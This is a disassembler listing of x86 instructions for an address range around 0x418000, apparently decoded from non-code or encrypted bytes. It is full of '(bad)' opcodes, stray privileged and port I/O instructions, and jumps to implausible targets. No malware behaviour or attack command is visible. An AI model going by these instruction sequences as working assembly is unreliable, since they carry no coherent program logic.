  418017:	cs jne 0x418069
  41801a:	fidivr WORD PTR [esi-0x6f]
  41801d:	fidiv  WORD PTR [edi-0x7db7e770]
  418023:	call   0x523c:0x2d989886
  41802a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41802b:	adc    esi,ebx
  41802d:	mov    DWORD PTR [eax+0x11f47b7],esp
  418033:	hlt    
  418034:	or     eax,0x3729038
  418039:	inc    edx
  41803a:	ret    0xa48c
  41803d:	fwait
  41803e:	mov    ds:0x1f75654d,al
  418043:	ss test al,0x73
  418046:	push   0x4b53eb95
  41804b:	ret    0xf31c
  41804e:	fs inc edx
  418050:	mov    esp,DWORD PTR [edi+0x6e578289]
  418056:	les    esi,FWORD PTR [ebx+0x59]
  418059:	jle    0x4180c0
  41805b:	in     al,0xfa
  41805d:	rcr    BYTE PTR [esi+0x5015ddfd],1
  418063:	mov    cl,0x9a
  418065:	fdiv   QWORD PTR [esi+0x29]
  418068:	(bad)  [edx]
  41806a:	shr    DWORD PTR [edx],1
  41806c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41806d:	inc    ebx
  41806e:	jo     0x41807b
  418070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418071:	int3   
  418072:	adc    al,0xfb
  418074:	rdpmc  
  418076:	ds cmp al,0xe
  418079:	xchg   ebp,eax
  41807a:	push   ecx
  41807b:	push   0x62
  41807d:	xchg   esi,eax
  41807e:	xor    al,0xe9
  418080:	mov    ds:0x715c7ce9,al
  418085:	in     eax,dx
  418086:	sub    al,0xaf
  418088:	data16 or al,BYTE PTR [edi]
  41808b:	xor    eax,0xa40d94ac
  418090:	xchg   DWORD PTR [ebp+0x5],ebp
  418093:	lahf   
  418094:	xchg   edi,eax
  418095:	sub    eax,esi
  418097:	dec    eax
  418098:	add    cl,ch
  41809a:	pop    ecx
  41809b:	lea    ebp,ds:0xac1ef0a
  4180a1:	sub    DWORD PTR [edx-0x31],eax
  4180a4:	outs   dx,BYTE PTR ds:[esi]
  4180a5:	xlat   BYTE PTR ds:[ebx]
  4180a6:	cmp    al,0x8
  4180a8:	daa    
  4180a9:	push   ebp
  4180aa:	sub    DWORD PTR ds:0x845acb51,edx
  4180b0:	clc    
  4180b1:	retf   
  4180b2:	xor    al,0x3a
  4180b4:	adc    eax,0xa8b8fa7a
  4180b9:	nop
  4180ba:	inc    esp
  4180bb:	inc    eax
  4180bc:	sbb    bl,BYTE PTR [ecx+0x208f32c5]
  4180c2:	adc    edx,DWORD PTR [ecx-0x16]
  4180c5:	stos   BYTE PTR es:[edi],al
  4180c6:	push   0xffffffa2
  4180c8:	imul   ebx,DWORD PTR [esi-0x6d],0xe
  4180cc:	mov    cl,0xf0
  4180ce:	pop    es
  4180cf:	mov    esp,0xb2fc738
  4180d4:	mov    eax,ds:0x7c79599b
  4180d9:	push   cs
  4180da:	mov    eax,ds:0x5358412c
  4180df:	pusha  
  4180e0:	stc    
  4180e1:	cmp    eax,0xa6543907
  4180e6:	sahf   
  4180e7:	push   es
  4180e8:	shr    DWORD PTR [edx],0x7d
  4180eb:	jmp    0x41e26d
	...
  418154:	add    BYTE PTR [eax],al
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x7f2fdebc,eax
  418163:	popa   
  418164:	repz push ecx
  418166:	add    eax,DWORD PTR [bx+di]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [edx],ch
  41816f:	pop    ecx
  418170:	lods   eax,DWORD PTR ds:[esi]
  418171:	xchg   ebx,eax
  418172:	loopne 0x4181b3
  418174:	xor    al,0xad
  418176:	(bad)  
  418178:	push   ecx
  418179:	(bad)  
  41817b:	mov    esi,0xc5322a30
  418180:	jns    0x418142
  418182:	xchg   ebp,eax
  418183:	mov    al,ds:0x7c2e2293
  418188:	add    BYTE PTR [eax-0x88df22a],dl
  41818e:	test   al,0x83
  418190:	fild   DWORD PTR [ecx-0x5f75bb6]
  418196:	cmp    DWORD PTR [ebx],0x76
  418199:	xor    edi,DWORD PTR [ecx+0x548d021b]
  41819f:	loop   0x41814c
  4181a1:	hlt    
  4181a2:	int3   
  4181a3:	sub    al,0xfa
  4181a5:	and    BYTE PTR [ecx],bl
  4181a7:	xchg   dh,dl
  4181a9:	push   ebp
  4181aa:	int3   
  4181ab:	test   al,0xcd
  4181ad:	les    ecx,FWORD PTR [ebx]
  4181af:	fnstenv [edx]
  4181b1:	jno    0x4181ff
  4181b3:	ret    
  4181b4:	pop    esi
  4181b5:	adc    BYTE PTR [eax-0x4d],0xd6
  4181b9:	inc    ebp
  4181ba:	(bad)  
  4181bb:	push   0x16ed66d5
  4181c0:	xor    DWORD PTR fs:[edx-0x7b],ebp
  4181c4:	adc    bl,BYTE PTR ds:0xdb06f427
  4181ca:	cmp    BYTE PTR [ecx],ah
  4181cc:	(bad)  
  4181ce:	cmp    eax,ebx
  4181d0:	lock jb 0x418155
  4181d3:	gs out 0x58,eax
  4181d6:	add    dl,ah
  4181d8:	mov    bl,0x54
  4181da:	inc    esp
  4181db:	and    bh,ch
  4181dd:	stc    
  4181de:	cdq    
  4181df:	cmp    esp,DWORD PTR [ebp+edx*4-0x3b]
  4181e3:	aaa    
  4181e4:	aaa    
  4181e5:	push   ebx
  4181e6:	(bad)  
  4181e7:	pop    eax
  4181e8:	lea    ecx,[esi+eiz*1+0x62b38429]
  4181ef:	push   cs
  4181f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f1:	gs mov edx,0x93b6e16b
  4181f7:	inc    ebx
  4181f8:	mov    cl,0x6f
  4181fa:	and    DWORD PTR [esi+0xc759e0],esp
  418200:	das    
  418201:	push   edi
  418202:	stc    
  418203:	push   edi
  418204:	sbb    DWORD PTR [esi],edi
  418206:	fst    st(1)
  418208:	mov    ds:0xc7f640e8,eax
  41820d:	push   ss
  41820e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41820f:	cmp    dl,ch
  418211:	(bad)  
  418212:	shl    al,cl
  418214:	or     al,BYTE PTR [esi-0x59]
  418217:	shl    esp,cl
  418219:	dec    ebx
  41821b:	sub    esp,edx
  41821d:	or     cl,cl
  41821f:	and    BYTE PTR [esi-0x2624fd44],dh
  418225:	xchg   ebp,eax
  418226:	and    bl,BYTE PTR [esi]
  418228:	inc    edx
  418229:	ret    0xac37
  41822c:	dec    esi
  41822d:	retf   0xfe59
  418230:	cmp    eax,0x3e2b2616
  418235:	iret   
  418236:	xor    ebx,DWORD PTR [ebp-0x19]
  418239:	jg     0x4182a4
  41823b:	xchg   edx,eax
  41823c:	stos   BYTE PTR es:[edi],al
  41823d:	mov    bh,0xcb
  41823f:	mov    cl,0xd7
  418241:	ins    BYTE PTR es:[edi],dx
  418242:	call   0x92c1168a
  418247:	sbb    edx,edi
  418249:	das    
  41824a:	cs daa 
  41824c:	(bad)  
  41824d:	adc    al,0xd6
  41824f:	mov    al,ds:0xe34f7485
  418254:	xor    al,0x20
  418256:	lds    ecx,FWORD PTR [ebp+0x7e]
  418259:	push   ecx
  41825a:	xor    eax,0x38774051
  41825f:	push   ds
  418260:	(bad)  
  418261:	jno    0x4181e9
  418263:	or     eax,DWORD PTR [ebx-0x6223d41e]
  418269:	sub    eax,0xef40ca0b
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x6542b8d6
  4182e4:	cwde   
  4182e5:	mov    eax,ds:0x10467
  4182ea:	add    BYTE PTR [ecx],al
  4182ec:	add    BYTE PTR [eax],al
  4182ee:	adc    al,al
  4182f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f1:	xor    al,ch
  4182f3:	mov    cl,0x1c
  4182f5:	dec    edx
  4182f6:	mov    al,ds:0xa5841091
  4182fb:	repz (bad) 
  4182fd:	in     eax,0x48
  4182ff:	scas   al,BYTE PTR es:[edi]
  418300:	mov    dl,0x39
  418302:	dec    esi
  418303:	fsubr  QWORD PTR [ebx-0x2d2b686c]
  418309:	jne    0x418349
  41830b:	pushf  
  41830c:	pop    edx
  41830d:	sub    ecx,ebp
  41830f:	sub    ah,bh
  418311:	adc    ebp,esi
  418313:	inc    eax
  418314:	int3   
  418315:	popa   
  418316:	adc    BYTE PTR [edx-0x1af86bd4],0xee
  41831d:	jge    0x41832f
  41831f:	cli    
  418320:	cwde   
  418321:	mov    ecx,0x36d1369e
  418326:	std    
  418327:	outs   dx,DWORD PTR ds:[esi]
  418328:	scas   al,BYTE PTR es:[edi]
  418329:	jno    0x4182fb
  41832b:	and    ah,bl
  41832d:	mov    ebp,DWORD PTR [eax+0x4da6f4a5]
  418333:	hlt    
  418334:	mov    ss,WORD PTR [esi+edi*8+0x5038c41]
  41833b:	mov    esp,0x2fde4d7f
  418340:	ss pop ecx
  418342:	sbb    al,0x8c
  418344:	dec    esi
  418345:	mov    al,ds:0x4d4acdf6
  41834a:	popa   
  41834b:	(bad)  
  41834c:	or     ebp,DWORD PTR [ebx+0x66]
  41834f:	fnstenv cs:[esi]
  418352:	arpl   WORD PTR [ecx-0x5d8578d0],di
  418358:	mov    esp,0xdbc22719
  41835d:	sub    BYTE PTR [edi+0x3d],0x6c
  418361:	into   
  418362:	sub    BYTE PTR [esi-0x6c7b0c9],dl
  418368:	mov    eax,ds:0x2050efeb
  41836d:	mov    edx,0x431251d9
  418372:	xchg   ebx,eax
  418373:	stos   BYTE PTR es:[edi],al
  418374:	xchg   ecx,eax
  418375:	std    
  418376:	aas    
  418377:	sbb    ch,dh
  418379:	call   0xad6cb504
  41837e:	and    eax,0x554de985
  418383:	loopne 0x418377
  418385:	in     eax,0x1a
  418387:	imul   edx,DWORD PTR [ecx],0x4f
  41838a:	xor    eax,0xe8fc37d6
  41838f:	mov    ebp,0xb382369e
  418394:	mov    ah,0xdf
  418396:	xchg   BYTE PTR [esi-0x5d0a4c51],dl
  41839c:	lods   eax,DWORD PTR ds:[esi]
  41839d:	push   eax
  41839e:	mov    esp,0x9599dd47
  4183a3:	or     dh,BYTE PTR [ecx+ebp*2-0x36]
  4183a7:	mov    ebp,0xd3bb107
  4183ac:	das    
  4183ad:	cld    
  4183ae:	dec    ebx
  4183af:	sbb    esp,DWORD PTR [edi-0x42]
  4183b2:	xchg   ecx,eax
  4183b3:	in     al,dx
  4183b4:	daa    
  4183b5:	sbb    ebx,DWORD PTR [ecx+0x27]
  4183b8:	icebp  
  4183b9:	lock xor al,0xc
  4183bc:	mov    al,cl
  4183be:	sti    
  4183bf:	push   eax
  4183c0:	inc    ebp
  4183c1:	pop    es
  4183c2:	mov    ebx,0x1244c70c
  4183c7:	ja     0x418419
  4183c9:	sbb    eax,esi
  4183cb:	ss inc ebx
  4183cd:	addr16 and eax,0x2f6246dd
  4183d3:	push   esi
  4183d4:	jmp    0xc37b:0xb50b0a92
  4183db:	inc    esp
  4183dc:	sar    cl,1
  4183de:	inc    esi
  4183df:	adc    eax,0xf94079dd
  4183e4:	fstp   DWORD PTR [ebx+0x5fb5d72f]
  4183ea:	xchg   ebp,eax
  4183eb:	xchg   esp,eax
  4183ec:	push   edx
  4183ed:	sahf   
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	test   DWORD PTR [ebp+0x567fbd2],0x1000001
  41846c:	add    BYTE PTR [eax],al
  41846e:	sub    bl,BYTE PTR [ebx-0xa737786]
  418474:	pop    edi
  418475:	loopne 0x4183f8
  418477:	add    dh,BYTE PTR [ebp-0x38]
  41847a:	fs loop 0x418489
  41847d:	test   al,0x56
  41847f:	push   0x1f82c5bd
  418484:	test   BYTE PTR [ebx+0x1088ae12],0xf0
  41848b:	mov    esi,0x1176b0b7
  418490:	fnstcw WORD PTR ds:0x4cf8d381
  418496:	or     edi,0x39
  418499:	push   0xdbe931bf
  41849e:	jmp    0x856eb509
  4184a3:	jne    0x418431
  4184a5:	out    0x31,eax
  4184a7:	fs push ebp
  4184a9:	pop    esp
  4184aa:	jge    0x4184d7
  4184ac:	in     eax,dx
  4184ad:	pop    es
  4184ae:	cmp    cl,BYTE PTR [edx]
  4184b0:	mov    eax,ds:0xf3e4a530
  4184b5:	sbb    DWORD PTR fs:[eax],esp
  4184b8:	fadd   DWORD PTR es:[ebp+ecx*8-0x2a]
  4184bd:	pop    ebp
  4184be:	sbb    ah,BYTE PTR [ebx+0x2c]
  4184c1:	push   ebp
  4184c2:	push   0xffffff99
  4184c4:	ror    bl,0x64
  4184c7:	xchg   ebp,eax
  4184c8:	cmp    al,0x3e
  4184ca:	jb     0x4184e8
  4184cc:	(bad)  
  4184cd:	xchg   esp,eax
  4184ce:	scas   eax,DWORD PTR es:[edi]
  4184cf:	fstp   st(4)
  4184d1:	sub    DWORD PTR [ebx+0x6ba82cd1],eax
  4184d7:	rcr    DWORD PTR [ecx+0x11],cl
  4184da:	lock add esi,DWORD PTR es:[eax+0x3108f27a]
  4184e2:	nop    esi
  4184e5:	xor    BYTE PTR [ecx-0x1a931f5],bh
  4184eb:	mov    edi,0x2bfd96fe
  4184f0:	iret   
  4184f1:	sar    BYTE PTR [edi],1
  4184f3:	repnz cmp esi,DWORD PTR [ecx+edi*1]
  4184f7:	push   ecx
  4184f8:	and    eax,0xced480c6
  4184fd:	dec    edi
  4184fe:	xchg   edx,eax
  4184ff:	outs   dx,BYTE PTR ds:[esi]
  418500:	cmc    
  418501:	sub    al,0x94
  418503:	aad    0xe7
  418505:	adc    eax,0xc7ce5d0b
  41850a:	and    DWORD PTR [edx+0x5e],0xcd3188c8
  418511:	jmp    0x71e7d82b
  418516:	test   ah,ah
  418518:	xlat   BYTE PTR ds:[ebx]
  418519:	jne    0x418512
  41851b:	cmp    eax,0x9685fc31
  418520:	inc    ebx
  418521:	out    dx,eax
  418522:	int    0xa4
  418524:	aas    
  418525:	sti    
  418526:	(bad)  
  418527:	imul   ecx,esi,0xffffffe1
  41852a:	jp     0x41855e
  41852c:	and    BYTE PTR [ebp+0x58],ah
  41852f:	test   eax,0xf26b6d85
  418534:	aad    0x10
  418536:	retf   0xbb39
  418539:	cmc    
  41853a:	sbb    esi,DWORD PTR [ebx-0x5b07ade0]
  418540:	aaa    
  418541:	mov    eax,0xa8bad1f2
  418546:	dec    eax
  418547:	aas    
  418548:	mov    edx,0xe0173e5
  41854d:	inc    esi
  41854e:	jmp    0xdcd8b17c
  418553:	push   esp
  418554:	or     dh,bl
  418556:	dec    edx
  418557:	xchg   ebx,eax
  418558:	test   al,0x42
  41855a:	mov    BYTE PTR [esi+0x1d601adf],bh
  418560:	xchg   esp,eax
  418561:	loop   0x4185b3
  418563:	addr16 in eax,0x6b
  418566:	pop    ecx
  418567:	in     eax,dx
  418568:	int3   
  418569:	mov    eax,ds:0x54e966e1
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	shl    dl,1
  4185e4:	push   eax
  4185e5:	pusha  
  4185e6:	addr16 push es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	pop    esp
  4185ef:	sbb    DWORD PTR [ebp-0x22b297f],0xdf45062
  4185f9:	jge    0x4185ab
  4185fb:	nop
  4185fc:	inc    ebx
  4185fd:	in     eax,dx
  4185fe:	sahf   
  4185ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418600:	dec    edi
  418601:	pop    ecx
  418602:	mov    al,ds:0xc51f0495
  418607:	jnp    0x41858d
  418609:	repz ds cwde 
  41860c:	pop    ss
  41860d:	cld    
  41860e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41860f:	fisttp QWORD PTR [eax+esi*1]
  418612:	in     al,0xe3
  418614:	ss sub eax,0xb67ca4a6
  41861a:	jns    0x4185ea
  41861c:	bound  dx,DWORD PTR ds:0x7f8b55e5
  418623:	loope  0x418618
  418625:	jno    0x41869d
  418627:	add    eax,0x2a7361eb
  41862c:	test   al,0x5f
  41862e:	iret   
  41862f:	inc    eax
  418630:	jbe    0x4186aa
  418632:	std    
  418633:	and    ebx,DWORD PTR [ebp+edx*4-0x7f]
  418637:	into   
  418638:	out    0x42,eax
  41863a:	js     0x41866f
  41863c:	mov    dl,0x5
  41863e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41863f:	mov    dh,0xee
  418641:	rcl    edx,1
  418643:	xor    cl,BYTE PTR [ecx]
  418645:	mov    ebp,0xe5267b1f
  41864a:	pop    esi
  41864b:	adc    BYTE PTR [edx+0x74ed3919],ah
  418651:	xor    DWORD PTR [ecx-0x30],esi
  418654:	xchg   esp,eax
  418655:	popa   
  418656:	push   0xffffffbf
  418658:	pop    esp
  418659:	mov    ebx,0xd26097b6
  41865e:	pusha  
  41865f:	rcr    edi,0x71
  418662:	pushf  
  418663:	dec    ecx
  418664:	adc    al,0xb0
  418666:	jns    0x418631
  418668:	sbb    eax,ebx
  41866a:	arpl   WORD PTR [esi-0x7abe3e8f],ax
  418670:	test   DWORD PTR [edx+0x24],esi
  418673:	mov    WORD PTR [ecx],ss
  418675:	mul    BYTE PTR [ebp+ecx*4+0xd]
  418679:	xlat   BYTE PTR ds:[ebx]
  41867a:	mov    bh,0x9
  41867c:	jb     0x418679
  41867e:	fistp  QWORD PTR [ebx-0x40f39881]
  418684:	call   DWORD PTR [eax]
  418686:	pop    ebp
  418687:	mov    al,ds:0xe030c343
  41868c:	repz sar eax,0xf9
  418690:	mov    DWORD PTR [edx-0x3f],edi
  418693:	fidivr DWORD PTR [edx+0x3e0c4378]
  418699:	add    al,0xee
  41869b:	call   0x5c81eab3
  4186a0:	add    eax,0x2eb57bcb
  4186a5:	cld    
  4186a6:	push   ecx
  4186a7:	or     al,0xd6
  4186a9:	add    al,0x8
  4186ab:	les    eax,FWORD PTR [ebx+0x5cbc2c0b]
  4186b1:	add    cl,bl
  4186b3:	lds    ebx,FWORD PTR [edi+ebx*2-0x3d8d1c48]
  4186ba:	xchg   esp,eax
  4186bb:	shr    esp,1
  4186bd:	mov    al,0xb3
  4186bf:	adc    eax,0xee2597d9
  4186c4:	stc    
  4186c5:	ds pop es
  4186c7:	sahf   
  4186c8:	mov    cl,0xbd
  4186ca:	and    al,0xc3
  4186cc:	jge    0x418735
  4186ce:	xchg   DWORD PTR ds:0xdf8cfaf5,ecx
  4186d4:	add    al,bl
  4186d6:	push   ss
  4186d7:	das    
  4186d8:	out    dx,eax
  4186d9:	lock shl BYTE PTR [eax+0x392f10e6],1
  4186e0:	adc    DWORD PTR [ecx],ebp
  4186e2:	pop    edx
  4186e3:	inc    edx
  4186e4:	dec    edx
  4186e5:	inc    ecx
  4186e6:	sti    
  4186e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186e8:	mov    gs:0x9c033ac8,eax
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	int    0xb3
  418764:	mov    bl,0x64
  418766:	addr16 pop es
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	js     0x7dae7cd2
  418774:	(bad)  
  418775:	pop    edx
  418776:	push   esp
  418777:	es cdq 
  418779:	dec    eax
  41877a:	push   ss
  41877b:	pop    edi
  41877c:	xchg   edi,eax
  41877d:	out    0x49,eax
  41877f:	jmp    0x384ce127
  418784:	mov    ebp,0x3cbd1a29
  418789:	jae    0x418779
  41878b:	inc    edx
  41878c:	xchg   ebx,eax
  41878d:	(bad)  
  41878e:	lods   al,BYTE PTR ds:[esi]
  41878f:	xchg   edi,eax
  418790:	xor    eax,0xa4a70bea
  418795:	icebp  
  418796:	out    dx,eax
  418797:	jne    0x418807
  418799:	xchg   ecx,eax
  41879a:	adc    esp,DWORD PTR [edx-0x7f]
  41879d:	popa   
  41879e:	lock call 0xb94e480f
  4187a4:	call   0xd873:0x9492582d
  4187ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ac:	add    eax,0x80ec6fcb
  4187b1:	push   ss
  4187b2:	mov    ds:0x16a9db79,al
  4187b7:	and    eax,0x95dbf499
  4187bc:	int3   
  4187bd:	or     al,0x77
  4187bf:	(bad)  
  4187c0:	pop    esi
  4187c1:	ja     0x418822
  4187c3:	hlt    
  4187c4:	data16 mov ah,0x8b
  4187c7:	cmp    edx,ebx
  4187c9:	dec    ebx
  4187ca:	push   es
  4187cb:	mov    ebx,DWORD PTR [esi]
  4187cd:	fld    DWORD PTR [ebx-0x32]
  4187d0:	(bad)  
  4187d1:	loope  0x418827
  4187d3:	leave  
  4187d4:	xor    al,0x30
  4187d6:	cs xchg esp,eax
  4187d8:	add    DWORD PTR [edx],ebp
  4187da:	adc    edx,DWORD PTR [ecx-0x6f]
  4187dd:	repz jmp 0x418810
  4187e0:	(bad)  
  4187e1:	mov    cl,0x35
  4187e3:	rol    BYTE PTR [ebp-0x1c76600],0xd
  4187ea:	fnsave [edx-0x5ad696f5]
  4187f0:	mov    eax,ds:0x36bda507
  4187f5:	clc    
  4187f6:	jne    0x418854
  4187f8:	scas   eax,DWORD PTR es:[edi]
  4187f9:	ja     0x4187d3
  4187fb:	call   0x9237:0xa8cc1556
  418802:	(bad)  
  418803:	fwait
  418804:	(bad)  
  418805:	adc    ah,ah
  418807:	push   ebx
  418808:	aaa    
  418809:	rcl    DWORD PTR [ebp+esi*8+0x59f68840],0x7a
  418811:	and    eax,DWORD PTR [ebx-0x41a87549]
  418817:	hlt    
  418818:	sar    BYTE PTR [edi+0x6239ef88],0x12
  41881f:	or     ch,BYTE PTR ds:0x92ee6f6
  418825:	or     al,BYTE PTR [edx]
  418827:	jecxz  0x4187d2
  418829:	data16 fwait
  41882b:	fwait
  41882c:	inc    eax
  41882d:	aas    
  41882e:	sbb    al,0xc8
  418830:	ror    BYTE PTR [esi+0x28],0x67
  418834:	xor    DWORD PTR [ebp-0xa830b80],0x57
  41883b:	or     bl,BYTE PTR [edi]
  41883d:	ja     0x4187f5
  41883f:	push   ss
  418840:	mov    edx,0x98aea8b7
  418845:	aad    0x3a
  418847:	dec    ebx
  418848:	aad    0x96
  41884a:	das    
  41884b:	push   edi
  41884c:	shl    BYTE PTR [edi-0x12],1
  41884f:	dec    edi
  418850:	je     0x4188a8
  418852:	cld    
  418853:	cmp    bl,BYTE PTR [ebx]
  418855:	sub    al,0x39
  418857:	nop
  418858:	sbb    BYTE PTR [esp+ebx*8],0x50
  41885c:	mov    al,0xbf
  41885e:	nop
  41885f:	xor    DWORD PTR [ecx+ecx*8+0x101225ad],ebp
  418866:	pop    es
  418867:	adc    DWORD PTR [edx+0x3322f],ecx
  41886d:	pop    ds
	...
  4188d6:	xchg   esp,eax
  4188d7:	enter  0x4337,0x7f
  4188db:	push   esp
  4188dd:	fbld   TBYTE PTR [esi-0xa63c533]
  4188e3:	imul   ebp
  4188e5:	lods   al,BYTE PTR ds:[esi]
  4188e6:	or     BYTE PTR [bx+di],al
  4188e9:	add    BYTE PTR [eax],al
  4188eb:	add    DWORD PTR [eax],eax
  4188ed:	add    BYTE PTR [esi-0x70bed65b],dl
  4188f3:	dec    ebx
  4188f4:	xchg   DWORD PTR [edi-0x14ff4f9c],esp
  4188fa:	mov    dl,0x4d
  4188fc:	fnstenv [ecx+edx*4-0x12]
  418900:	loop   0x4188bd
  418902:	test   al,0x9a
  418904:	je     0x418887
  418906:	sbb    al,dl
  418908:	data16 add bh,ah
  41890b:	mov    esp,0xb36f8234
  418910:	mov    eax,ds:0xbe2e1e8e
  418915:	mov    BYTE PTR [ecx-0x65dd0a49],bl
  41891b:	mov    DWORD PTR [ebx-0x3ec58a47],0xe392a3e6
  418925:	sahf   
  418926:	push   ss
  418927:	push   edi
  418928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418929:	cmc    
  41892a:	inc    ebp
  41892b:	cmp    BYTE PTR [eax+eax*4-0x361dc625],al
  418932:	push   0x52b00e0a
  418937:	sub    edi,esi
  418939:	cmc    
  41893a:	adc    al,0xf8
  41893c:	pusha  
  41893d:	mov    ebp,0x4494128f
  418942:	outs   dx,BYTE PTR ds:[esi]
  418943:	sbb    BYTE PTR [edi+0x2a],dl
  418946:	mul    ah
  418948:	add    esp,DWORD PTR [ecx]
  41894a:	jge    0x4188ce
  41894c:	push   edi
  41894d:	(bad)  
  41894f:	clc    
  418950:	ss gs pop edx
  418953:	sub    al,0x1e
  418955:	(bad)  
  418956:	or     esp,DWORD PTR [edx-0x24a386a7]
  41895c:	pop    edx
  41895d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895e:	mov    ch,0xc7
  418960:	inc    esp
  418961:	mov    ah,0xc0
  418963:	xor    DWORD PTR [edx-0x390f6a73],ebp
  418969:	sub    dl,BYTE PTR [esi-0xadfb669]
  41896f:	call   0x9e06:0xca050451
  418976:	cmp    BYTE PTR [edx+ebp*8+0x52683868],dl
  41897d:	xor    DWORD PTR [esi-0x65],ebx
  418980:	mov    eax,0x2f3962a7
  418985:	cmp    cl,cl
  418987:	inc    eax
  418988:	jmp    0x46af4eb0
  41898d:	xchg   esp,eax
  41898e:	sbb    edi,DWORD PTR [esi-0x57]
  418991:	pop    ds
  418992:	push   esp
  418993:	inc    esp
  418994:	(bad)  
  418995:	out    0x28,eax
  418997:	xchg   edx,eax
  418998:	push   ebx
  418999:	in     al,0x5d
  41899b:	mov    ds:0x1fc61bb7,eax
  4189a0:	mov    ds:0xdb701ff5,al
  4189a5:	inc    eax
  4189a6:	into   
  4189a7:	mov    bl,0x5
  4189a9:	mov    ch,0x23
  4189ab:	je     0x418a16
  4189ad:	mov    ds:0x8bcbd586,eax
  4189b2:	nop
  4189b3:	retf   0x47e1
  4189b6:	xor    eax,0x6765df54
  4189bb:	scas   al,BYTE PTR es:[edi]
  4189bc:	cdq    
  4189bd:	std    
  4189be:	inc    edi
  4189bf:	in     eax,dx
  4189c0:	mov    bh,0x55
  4189c2:	rcr    ebx,0x98
  4189c5:	and    BYTE PTR [esi+0x4aa05c66],0x8a
  4189cc:	popf   
  4189cd:	mov    DWORD PTR [edi],ebp
  4189cf:	sahf   
  4189d0:	mov    edx,0x1d73d18e
  4189d5:	adc    cl,dl
  4189d7:	gs add eax,0xe3fb8860
  4189dd:	or     eax,0x4e2a7dde
  4189e2:	pop    ds
  4189e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189e5:	xchg   edx,eax
  4189e6:	retf   
  4189e7:	jmp    0x63b1:0xb1da9bfd
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x9a0cf769
  418a65:	bound  esp,QWORD PTR [edi+0x9]
  418a68:	add    DWORD PTR [eax],eax
  418a6a:	add    BYTE PTR [ecx],al
  418a6c:	add    BYTE PTR [eax],al
  418a6e:	dec    esi
  418a6f:	or     eax,0x6ced5376
  418a74:	pop    esi
  418a75:	cmp    BYTE PTR ds:0x526db874,dl
  418a7b:	pop    esi
  418a7c:	shl    BYTE PTR [edx+0x2b],0xb6
  418a80:	and    dh,BYTE PTR [ebx]
  418a82:	pop    esi
  418a83:	lea    edi,[edx+0x1d515ce3]
  418a89:	aaa    
  418a8a:	jmp    0x7ad72011
  418a8f:	dec    esi
  418a90:	ficomp WORD PTR [esi]
  418a92:	aas    
  418a93:	ss dec esp
  418a95:	aas    
  418a96:	sahf   
  418a97:	sub    eax,0xe66bb1d2
  418a9c:	dec    ecx
  418a9d:	sbb    DWORD PTR [edx],eax
  418a9f:	mov    bh,0x79
  418aa1:	pop    ecx
  418aa2:	mov    al,0xb2
  418aa4:	push   cs
  418aa5:	inc    esp
  418aa6:	mov    esi,0x827bff80
  418aab:	out    0xa2,eax
  418aad:	test   DWORD PTR [edx-0x3c4d15b],0x468d04a0
  418ab7:	pop    esp
  418ab8:	test   al,0x30
  418aba:	ret    0xd89d
  418abd:	cld    
  418abe:	pop    ecx
  418abf:	pop    eax
  418ac0:	and    bh,BYTE PTR [ecx+0x24c96139]
  418ac6:	dec    DWORD PTR ds:0xd6300052
  418acc:	or     BYTE PTR [edx-0x5ddace7f],dl
  418ad2:	out    0xaf,eax
  418ad4:	or     ebx,DWORD PTR [ecx+ecx*8]
  418ad7:	das    
  418ad8:	inc    esi
  418ad9:	in     al,dx
  418ada:	imul   bx,sp,0x537f
  418adf:	or     dl,al
  418ae1:	mov    ecx,0x842495a7
  418ae6:	imul   ebx,DWORD PTR [esi+0x280f4a9e],0xd1cb7855
  418af0:	mov    ds:0x279c0131,al
  418af5:	cmp    dl,bl
  418af7:	mov    al,0xd
  418af9:	in     al,dx
  418afa:	inc    eax
  418afb:	clc    
  418afc:	aad    0xf4
  418afe:	inc    ecx
  418aff:	into   
  418b00:	inc    esp
  418b01:	icebp  
  418b02:	xlat   BYTE PTR ds:[ebx]
  418b03:	test   BYTE PTR [eax-0x33cd3c07],bh
  418b09:	jecxz  0x418aca
  418b0b:	mov    ch,0xa5
